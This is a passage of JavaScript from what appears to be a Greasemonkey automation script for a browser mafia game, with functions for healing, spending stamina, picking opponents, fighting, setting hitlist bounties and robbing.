//    DEBUG(' JOB TAB - path - returning  tst =' + tst + '=');
  if (tst==null)     DEBUG(' JOB TAB - path - !tst path not found - ');
  if   (!elt ||  tst==null ) {
        DEBUG(' JOB TAB - path - not found RETURNING -1 no elt or tst');
    return -1;  }
//    return parseInt(elt.getAttribute('onclick').split('ExpertMapController.changePath(')[1].split(');')   ) ; // returns 0,
  return tst;
}

function onJobTab(tabno) {
  return currentJobTab() == parseInt(tabno) ? true : false;
}

function onJobTabpath(tabnopath) {
  return currentJobTabPath() == parseInt(tabnopath) ? true : false;
}

function canForceHeal() {
  if(!isGMChecked('hideInHospital'))
    return true;

  // bypass all lower HiH settings and heal while health is above 19 and below 'need to heal minium'
  if((health > 19) && isGMChecked('forceHealOpt7') ) {
    DEBUG( 'heal if above 19 is checked, and true, in canforceheal ');
    return true;
    }

  // if able to level up on stamina and checked to do so, bypass HiH
  if((SpendStamina.canBurn && stamina > 0) && isGMChecked('allowStaminaToLevelUp') ) {
    DEBUG( 'enough stamina left to level up, and burn to level up, checked in canforceheal ');
    return true;
    }

  // Heal after 5 minutes
  if(isGMChecked('forceHealOpt5') && GM_getValue('healWaitStarted') && timeLeftGM('healWaitTime')) {
    DEBUG( ' healing blocked ' + GM_getValue('healWaitStarted') + ' due to 5 minute wait timer. remaining:' + timeLeftGM('healWaitTime') ); // hide/remove after testing
   return false;
  } else {
      if(isGMChecked('forceHealOpt5')) {
        DEBUG( '5 minute timer is up, Allowing Heal'); // hide/remove after testing
        return true;
      }
  }
  // Heal when stamina is full
  if (isGMChecked('forceHealOpt4') && stamina >= maxStamina)
    return true;

  // Heal when stamina can be spent
  if (isGMChecked('forceHealOpt3') && canSpendStamina(0))
    return true;

  DEBUG( 'healing blocked in HiH (canforceheal) '); // hide/remove after testing
  return false;
}

function canSpendStamina(minHealth) {
  if (!stamina) return false;
  if (!isGMChecked('staminaSpend')) return false;

  var stamMode = getStaminaMode();

  if (isNaN(minHealth)) {
    // Up to 28 damage can be received in a fight.
    minHealth = isGMChecked('attackCritical') ? 20 : 29;
    switch (stamMode) {
      case STAMINA_HOW_AUTOHITLIST:
      case STAMINA_HOW_ROBBING:
        minHealth = 0;
      case STAMINA_HOW_FIGHTROB:
        if( stamina > 25)  {
          minHealth = 0;
        }
    }
  }

  if (health < minHealth) {
    DEBUG('Not spending stamina: health=' + health + ', minimum=' + minHealth);
    return false;
  }

  if (stamina <= SpendStamina.floor && !SpendStamina.canBurn) {
    DEBUG('Not spending stamina: stamina=' + stamina +
          ', floor=' + SpendStamina.floor + ', burn=' + SpendStamina.canBurn);
    return false;
  }

  if (stamina < SpendStamina.ceiling && !SpendStamina.canBurn &&
      !GM_getValue('useStaminaStarted')) {
    DEBUG('Rebuilding stamina: stamina=' + stamina +
          ', ceiling=' + SpendStamina.ceiling + ', burn=' + SpendStamina.canBurn);
    return false;
  }

  // Only spend if stamina >= 20
  if(GM_getValue('staminaSpendHow') != STAMINA_HOW_RANDOM && stamMode == STAMINA_HOW_ROBBING)
    return (stamina >= 25);
  else if (stamMode == STAMINA_HOW_ROBBING) {
    if (stamina >= 25) return true;
    else {
      randomizeStamina();
      return canSpendStamina();
    }
  }

  return true;
}

function autoHitlist() {
  // Go to the correct city.
  var loc = GM_getValue('autoHitListLoc', NY);
  if (loc != cities.length && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onFightTab() && !autoHitlist.profileSearch && !autoHitlist.setBounty) {
    Autoplay.fx = goFightTab;
    //Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  // Go to the opponent's profile.
  var id = parseInt(GM_getValue('autoHitOpponentList', ''));
  if (!id) {
    // If nothing is here, and fighting is "random", fight someone else
    if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) return false;
    // The user-specified list is empty or invalid.
    addToLog('warning Icon', 'Can\'t autohit because the list of opponents is empty or invalid. Turning automatic hitlisting off.');
    GM_setValue('staminaSpend', 0);
    if(isGMChecked('bgAutoHitCheck')) GM_setValue('bgAutoHitCheck',0);
    return false;
  }

  opponent = new Player();
  opponent.id = String(id);

  if (!onProfileNav() && !autoHitlist.setBounty) {
    // Go to the opponent's profile.
    autoHitlist.profileSearch = opponent;
    Autoplay.fx = goProfileNav(opponent);
    Autoplay.start();
    return true;
  }

  if (autoHitlist.profileSearch && onProfileNav()) {
    opponent = autoHitlist.profileSearch;
    autoHitlist.profileSearch = undefined;
    opponent.profileHitlist = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
    DEBUG('Hitlisting from profile');
    var hitlistElt = opponent.profileHitlist;
    autoHitlist.setBounty = true;
    var elt = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
    if (elt) {
      Autoplay.fx = function() {
        clickAction = 'autohit';
        clickContext = opponent;
        clickElement(elt);
        DEBUG('Clicked "Add to Hitlist".');
      };
      Autoplay.start();
      return true;
    }
  }

  if(autoHitlist.setBounty){
    autoHitlist.setBounty = undefined;
    var formElt = xpathFirst('.//form[@id="createhit"]', innerPageElt);
    // Set the amount (random).
    var amountElt = xpathFirst('.//input[@type="text"]', formElt);
    if (!amountElt){
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      return true;
    }

    if(isGMChecked('autoHitListRandom')){
      amountElt.value = Math.pow(10, (Math.floor(Math.random()*4)+4));
    } else {
      amountElt.value = parseCash(GM_getValue('autoHitListBounty', 0));
    }

    // Make the hit
    var submitElt = xpathFirst('.//button[@type="submit"]', formElt);
    if (!submitElt) {
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      return true;
    }
    Autoplay.fx = function() {
      clickAction = 'autohit';
      clickContext = opponent;
      submitElt.click();
      DEBUG('Clicked to Set Bounty');
    };
    Autoplay.start();
    return true;
  }
}

function autoFight(how) {
  // Go to the correct city.
  var loc = GM_getValue('fightLocation', NY);
  if( loc == RANDOM_CITY){
    loc = GM_getValue('fightNewLocation', NY);
  }

  if (loc != ACTIVE_CITY && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onFightTab() && !autoFight.profileSearch) {
    Autoplay.fx = goFightTab;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Get an opponent.
  var opponent;
  if (autoFight.profileSearch && onProfileNav()) {
    opponent = autoFight.profileSearch;
    autoFight.profileSearch = undefined;
    lastOpponent = undefined;
    if (isGMChecked('staminaPowerattack') && GM_getValue('burstMode', 0) == BURST_ALWAYS && ((isGMChecked('stopPA') && health >= GM_getValue('stopPAHealth')) || !isGMChecked('stopPA')))
      opponent.profileAttack = xpathFirst('.//a[contains(@onclick,"xw_action=power_attack") and contains(., "Power Attack")]', innerPageElt);
    if (!opponent.profileAttack)
      opponent.profileAttack = xpathFirst('.//a[contains(@onclick,"xw_action=attack") and contains(., "Attack")]', innerPageElt);
    DEBUG('Attacking from profile');
  } else if (how == STAMINA_HOW_FIGHT_LIST) {
    var id = parseInt(GM_getValue('fightList', ''));
    if (!id) {
      // If nothing is here, and fighting is "random", fight someone else
      if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) return false;

      // The user-specified list is empty or invalid.
      addToLog('warning Icon', 'Can\'t fight because the list of opponents is empty or invalid. Turning automatic fighting off.');
      GM_setValue('staminaSpend', 0);
      return false;
    }
    opponent = new Player();
    opponent.id = String(id);
    DEBUG('Attacking from fight list');
  } else {
    // Check for any new opponents.
    opponent = findFightOpponent(innerPageElt);
    DEBUG('Attacking from find fight list');

    // For stealth mode fights, if we don't have a new opponent then
    // choose one of the inactive opponents we've already fought.
    if ((!opponent || opponent === -1) &&
        isGMChecked('fightStealth')) {
      var l = fightListInactive.get();
      if (l.length) {
        addToLog('info Icon', '"Use Fight Stealth" is enabled, attacking previously "deemed" iced targets.');
        opponent = l[Math.floor(Math.random() * l.length)];
        opponent.profileAttack="";//stop TOS screen
        DEBUG('Attacking from inactive list');
      }
    }

    if (opponent === -1) {
      DEBUG('No opponents even after seeing the fight list.');
      setNextFightCity();
      return false;
    }

    if (!opponent) {
      // Go to the fight list to find opponents.
      addToLog('process Icon', 'No opponents. Going to fight list.');
      Autoplay.fx = goFightNav;
      Autoplay.start();
      return true;
    }
  }
  if (!opponent) return false;

  var attackElt = opponent.profileAttack;
  if (!attackElt && opponent.attack && opponent.attack.scrollWidth > 0) {
    attackElt = opponent.attack;
  }

  // Just click the "Attack Again" button if it's there
  if (lastOpponent && lastOpponent.attackAgain && opponent.match(lastOpponent)) {
    attackElt = lastOpponent.attackAgain;
    DEBUG('Clicking "Attack Again"!');
  }

  if (!attackElt) {
    if (opponent.id && !onProfileNav()) {
      // Go to the opponent's profile.
      autoFight.profileSearch = opponent;
      Autoplay.fx = function(){goProfileNav(opponent);};
      Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
      Autoplay.start();
      return true;
    }
    DEBUG('No way to attack opponent, id=' + opponent.id);
    return false;
  }

  // Check for pulse, skipped iced opponents on the fight list
  if (isGMChecked('iceCheck') && (how == STAMINA_HOW_FIGHT_LIST)) {
    createAjaxPage(true);
    var iceElt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxPage + '","' + SCRIPT.controller + 'hitlist' + SCRIPT.action + 'set&target_id=' + opponent.id + '", 1, 1, 0, 0); return false;'});
    Autoplay.fx = function() {
      clickAction = 'icecheck fightlist';
      clickContext = opponent;
      clickElement(iceElt);
    };
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }
  // Attack!
  Autoplay.fx = function() {
    clickAction = 'fight';
    clickContext = opponent;
    staminaBurst (BURST_ALWAYS, attackElt);
    DEBUG('Clicked to fight: name=' + opponent.name +
          ', id=' + opponent.id + ', level=' + opponent.level +
          ', mafia=' + opponent.mafia + ', faction=' + opponent.faction);
  };
  Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
  Autoplay.start();
  return true;
}

function setNextFightCity(){
  var loc = GM_getValue('fightLocation', NY);
  if( loc != RANDOM_CITY){
    return;
  }
  var newCity;
  do {
    newCity = Math.floor(Math.random()*(cities.length));
  } while (level < cities[newCity][CITY_LEVEL] || isGMEqual('fightNewLocation', newCity));

  DEBUG('Setting to ' + cities[newCity][CITY_NAME] + ' for next fight.');
  GM_setValue('fightNewLocation', newCity);
}

function staminaBurst (burstMode, clickElt) {
  var numClicks = 1;
  if (isGMChecked('burstStamina') && GM_getValue('burstPoints', 0) > 0) {
    numClicks = isGMEqual('burstMode',burstMode) ? GM_getValue('burstPoints', 1) : 1;
  }
  if(isGMChecked('stopBursts') && health < GM_getValue('stopBurstsHealth')) numClicks = 1;
  DEBUG('Health : '+health+ ' - Min Health for Bursts : '+GM_getValue('stopBurstsHealth') + ' - numClicks : ' +numClicks);
  clickBurst (clickElt, parseInt(numClicks));
}

function autoRob() {
  var loc = GM_getValue('robLocation', NY);
  if (city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onRobbingTab()) {
    Autoplay.fx = goRobbingTab;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  if (needToRefresh()) {
    DEBUG("Refreshing the rob grid.");
    // refresh the 3x3 grid.
    Autoplay.fx = refreshRobbingGrid;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  } else {
    Autoplay.fx = function(){
      clickAction = 'autoRob';
      clickContext = getCurRobSlotId();
      DEBUG("Context : " + clickContext);
      doRob();
    };
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }
}

function onRobbingTab() {
  // Return true if we're on the robbing tab, false otherwise.
  if (xpathFirst('//li[contains(@class, "tab_on")]//a[contains(., "Robbing")]')) {
    return true;
  }
  return false;
}

function goRobbingTab() {
  var elt = xpathFirst('//div[@class="tab_content"]//a[contains(., "Robbing")]');
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to robbing tab.');
}

function needToRefresh()
{
  var eltRefreshLink = xpathFirst('//a[@id="rob_refresh_cost"]//span[contains(.,"0 stamina")]');
  if(eltRefreshLink)
    return true;

  return false;
}

function refreshRobbingGrid() {
  var elt = xpathFirst('//a[@id="rob_refresh_cost"]');
  clickElement(elt);
  DEBUG('Clicked to refresh robbing grid.');
};

function sleepRob(ms){
  var dt = new Date();
  dt.setTime(dt.getTime() + ms);
  while (new Date().getTime() < dt.getTime());
}

function doRob(){
  var m;
  var eltRobStam = xpathFirst('//div[@class="rob_prop_stamina"]');
  if (eltRobStam) {
    if (m = /(.*)/.exec(eltRobStam.innerHTML)) {
      var stam = m[1].replace(/[^0-9]/g, '');
      GM_setValue('total